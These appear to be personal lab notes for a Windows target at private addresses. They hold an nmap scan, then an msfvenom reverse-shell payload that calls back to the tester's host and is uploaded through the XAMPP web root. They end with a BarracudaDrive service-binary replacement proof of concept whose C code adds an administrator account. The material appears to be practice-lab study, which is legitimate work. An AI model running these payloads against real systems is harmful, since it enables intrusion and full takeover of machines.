@@ -1,0 +1,232 @@
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
+5040/tcp  open  unknown
+8000/tcp  open  http-alt      BarracudaServer.com (Windows)
+| http-methods: 
+|   Supported Methods: OPTIONS GET HEAD PROPFIND PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK POST
+|_  Potentially risky methods: PROPFIND PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
+|_http-title: Home
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-favicon: Unknown favicon MD5: FDF624762222B41E2767954032B6F1FF
+| http-webdav-scan: 
+|   Server Type: BarracudaServer.com (Windows)
+|   Server Date: Mon, 20 Apr 2026 11:18:26 GMT
+|   WebDAV type: Unknown
+|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
+|_http-server-header: BarracudaServer.com (Windows)
+| fingerprint-strings: 
+|   FourOhFourRequest, Socks5: 
+|     HTTP/1.1 200 OK
+|     Date: Mon, 20 Apr 2026 11:16:01 GMT
+|     Server: BarracudaServer.com (Windows)
+|     Connection: Close
+|   GenericLines, GetRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Mon, 20 Apr 2026 11:15:55 GMT
+|     Server: BarracudaServer.com (Windows)
+|     Connection: Close
+|   HTTPOptions, RTSPRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Mon, 20 Apr 2026 11:16:06 GMT
+|     Server: BarracudaServer.com (Windows)
+|     Connection: Close
+|   SIPOptions: 
+|     HTTP/1.1 400 Bad Request
+|     Date: Mon, 20 Apr 2026 11:17:08 GMT
+|     Server: BarracudaServer.com (Windows)
+|     Connection: Close
+|     Content-Type: text/html
+|     Cache-Control: no-store, no-cache, must-revalidate, max-age=0
+|_    <html><body><h1>400 Bad Request</h1>Can't parse request<p>BarracudaServer.com (Windows)</p></body></html>
+30021/tcp open  ftp           FileZilla ftpd 0.9.41 beta
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -r--r--r-- 1 ftp ftp            536 Nov 03  2020 .gitignore
+| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 app
+| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 bin
+| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 config
+| -r--r--r-- 1 ftp ftp            130 Nov 03  2020 config.ru
+| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 db
+| -r--r--r-- 1 ftp ftp           1750 Nov 03  2020 Gemfile
+| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 lib
+| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 log
+| -r--r--r-- 1 ftp ftp             66 Nov 03  2020 package.json
+| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 public
+| -r--r--r-- 1 ftp ftp            227 Nov 03  2020 Rakefile
+| -r--r--r-- 1 ftp ftp            374 Nov 03  2020 README.md
+| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 test
+| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 tmp
+|_drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 vendor
+|_ftp-bounce: bounce working!
+| ftp-syst: 
+|_  SYST: UNIX emulated by FileZilla
+33033/tcp open  unknown
+| fingerprint-strings: 
+|   GenericLines: 
+|     HTTP/1.1 400 Bad Request
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.0 403 Forbidden
+|     Content-Type: text/html; charset=UTF-8
+|     Content-Length: 3102
+|     <!DOCTYPE html>
+|     <html lang="en">
+|     <head>
+|     <meta charset="utf-8" />
+|     <title>Action Controller: Exception caught</title>
+|     <style>
+|     body {
+|     background-color: #FAFAFA;
+|     color: #333;
+|     margin: 0px;
+|     body, p, ol, ul, td {
+|     font-family: helvetica, verdana, arial, sans-serif;
+|     font-size: 13px;
+|     line-height: 18px;
+|     font-size: 11px;
+|     white-space: pre-wrap;
+|     pre.box {
+|     border: 1px solid #EEE;
+|     padding: 10px;
+|     margin: 0px;
+|     width: 958px;
+|     header {
+|     color: #F0F0F0;
+|     background: #C52F24;
+|     padding: 0.5em 1.5em;
+|     margin: 0.2em 0;
+|     line-height: 1.1em;
+|     font-size: 2em;
+|     color: #C52F24;
+|     line-height: 25px;
+|     .details {
+|_    bord
+44330/tcp open  ssl/unknown
+|_ssl-date: 2026-04-20T11:18:54+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=server demo 1024 bits/organizationName=Real Time Logic/stateOrProvinceName=CA/countryName=US
+| Issuer: commonName=demo CA/organizationName=Real Time Logic/stateOrProvinceName=CA/countryName=US
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: md5WithRSAEncryption
+| Not valid before: 2009-08-27T14:40:47
+| Not valid after:  2019-08-25T14:40:47
+| MD5:   3dd3:7bf7:464d:a77b:6d04:f44c:154b:7563
+|_SHA-1: 3dc2:5fc6:a16f:1c51:8eee:45ce:80cf:b35e:7f92:ebbe
+45332/tcp open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
+|_http-title: Quiz App
+| http-methods: 
+|   Supported Methods: HEAD GET POST OPTIONS TRACE
+|_  Potentially risky methods: TRACE
+45443/tcp open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
+| http-methods: 
+|   Supported Methods: HEAD GET POST OPTIONS TRACE
+|_  Potentially risky methods: TRACE
+|_http-title: Quiz App
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
+
+browser in port 8000. create a administrator account.
+run gobuster find /fs/c
+http://192.168.187.127:8000/fs/c/Users/Jerren/Desktop/local.txt
+http://192.168.187.127:8000/fs/c/Users/Administrator/Desktop/proof.txt
+feel like something wrong with this lab.
+####################################################################################
+http://192.168.222.127:45332/phpinfo.php
+find username Jerren and $_SERVER['CONTEXT_DOCUMENT_ROOT']	C:/xampp/htdocs
+this is xampp document default directory 
+
+http://192.168.222.127:33033
+in here need to try password reminder and reset password for jerren. 
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.201 LPORT=21 -f exe > reverse.exe
+upload to C:\xampp\htdocs then browser in 192.168.222.127:45443/reverse.exe to activate the shell.
+
+just need to remember default document directory is C:\xampp\htdocs . and try other port to run the payload if original port fail.
+then follow below step to finish PE by exploit BarracudaDrive v6.5 - Insecure Folder Permissions
+
+## Insecure Folder Permission
+C:\>cacls C:\bd
+C:\bd BUILTIN\Administrators:(OI)(CI)(ID)F
+      NT AUTHORITY\SYSTEM:(OI)(CI)(ID)F
+      BUILTIN\Users:(OI)(CI)(ID)R
+      NT AUTHORITY\Authenticated Users:(ID)C
+      NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(ID)C
+
+## Insecure File/Service Permission
+C:\>cacls C:\bd\bd.exe
+C:\bd\bd.exe BUILTIN\Administrators:(ID)F
+             NT AUTHORITY\SYSTEM:(ID)F
+             BUILTIN\Users:(ID)R
+             NT AUTHORITY\Authenticated Users:(ID)C
+
+C:\>sc qc bd
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: bd
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : "C:\bd\bd.exe"
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : BarracudaDrive ( bd ) service
+        DEPENDENCIES       : Tcpip
+        SERVICE_START_NAME : LocalSystem
+
+## Local Privilege Escalation Proof of Concept
+#0.  Download & install
+
+#1.  Create low privileged user & change to the user
+## As admin
+C:\>net user lowpriv Password123! /add
+C:\>net user lowpriv | findstr /i "Membership Name" | findstr /v "Full"
+User name                    lowpriv
+Local Group Memberships      *Users
+Global Group memberships     *None
+
+#2.  Move the Service EXE to a new name
+C:\bd>whoami
+desktop\lowpriv
+C:\bd>move bd.exe bd.service.exe
+        1 file(s) moved.
+
+#3.  Create malicious binary on kali linux
+## Add Admin User C Code
+   kali# cat addAdmin.c
+     int main(void){
+     system("net user boku mypassword /add");
+     system("net localgroup Administrators boku /add");
+     WinExec("C:\\bd\\bd.service.exe",0);
+    return 0;
+    }
+
+## Compile Code
+   kali# i686-w64-mingw32-gcc addAdmin.c -l ws2_32 -o bd.exe
+
+#4. Transfer created 'bd.exe' to the Windows Host
+
+#5. Move the created 'bd.exe' binary to the 'C:\bd\' Folder
+C:\bd>move C:\Users\lowpriv\Downloads\bd.exe .
+
+#6. Check that exploit admin user doesn't exit
+C:\bd>net user boku
+The user name could not be found
+
+#6. Reboot the Computer
+C:\bd>shutdown /r
+
+#7. Login & look at that new Admin
+C:\Users\lowpriv>net user boku | findstr /i "Membership Name" | findstr /v "Full"
+User name                    boku
+Local Group Memberships      *Administrators       *Users
+Global Group memberships     *None
+
+
+
+
+
+
+
+
+
